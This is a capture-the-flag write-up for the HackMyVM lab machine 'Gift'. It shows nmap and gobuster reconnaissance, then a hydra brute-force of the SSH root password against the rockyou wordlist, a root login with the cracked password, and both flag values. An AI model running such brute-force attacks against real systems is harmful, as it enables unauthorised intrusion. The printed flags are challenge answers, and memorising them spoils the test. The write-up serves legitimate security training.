# Gift

## Executive Summary
|Machine|Author|Category|Platform|
|-------|------|--------|--------|
|Gift   |sml   |Beginner|HackMyVM|

**Summary**: Gift is a straightforward Linux machine that emphasizes the importance of not overthinking security challenges.

## Reconnaissance
### Network Discovery
The initial network scan identified a single target machine one the local network:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sn 192.168.100.1/24             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 00:23 EST
Nmap scan report for AP-AX3000CV2-8649.lan (192.168.100.1)
Host is up (0.0061s latency).
MAC Address: 00:C8:96:93:86:48 (CIG Shanghai)
Nmap scan report for gift.lan (192.168.100.131)
Host is up (0.0016s latency).
MAC Address: 08:00:27:96:27:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```
The scan revealed `192.168.100.131` as our target, running in VirtualBox.

### Port Enumeration
A comprehensive port scan revealed two open services:
```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -sCV -p- 192.168.100.131                
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 00:28 EST
Nmap scan report for gift.lan (192.168.100.131)
Host is up (0.00062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:96:27:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.13 seconds
```
**Port 22/tcp**: OpenSSH 8.3 running.

**Port 80/tcp**: nginx web server with no title.

### Web Application Analysis
#### Directory Enumeration
Using `gobuster` to discover web content:
```bash
┌──(dungcngo㉿kali)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.100.131 -x php,txt,html,bak,zip,gif -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.131
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,gif,php,txt,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 57]
Progress: 1543899 / 1543899 (100.00%)
===============================================================
Finished
===============================================================
```
This is strange that we do not have any directories except `/index.html`. We also tried running the scan with different wordlist but did not get anything.

#### Web Content Analysis
Examining the web page content revealed a cryptic message:
```bash
┌──(dungcngo㉿kali)-[~]
└─$ curl -i 192.168.100.131/index.html
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 28 Feb 2026 07:28:22 GMT
Content-Type: text/html
Content-Length: 57
Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT
Connection: keep-alive
ETag: "5f678373-39"
Accept-Ranges: bytes


Dont Overthink. Really, Its simple.
	<!-- Trust me -->
```

## Initial Access

### SSH Brute-Force Attack
Since we did not find anything interesting, we decided to enumerate the other port, which is SSH. we tried to brute-force the `root` user's password using `hydra`.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.100.131 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-28 02:40:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.100.131:22/
[22][ssh] host: 192.168.100.131   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-28 02:41:00
```
We got the password for user `root` is `simple`.

### Root Access Confirmation
```bash
┌──(dungcngo㉿kali)-[~]
└─$ ssh root@192.168.100.131
The authenticity of host '192.168.100.131 (192.168.100.131)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.131' (ED25519) to the list of known hosts.
root@192.168.100.131's password: 
IM AN SSH SERVER
gift:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Direct `root` access obtained without requiring privilege escalation.

## Flags
Both `user` and `root` flags were immediately accessible from the `root` directory:
```bash
gift:~# ls 
root.txt  user.txt
gift:~# cat root.txt
HMVtyr543FG
gift:~# cat user.txt
HMV665sXzDS
```

***You are welcome!***
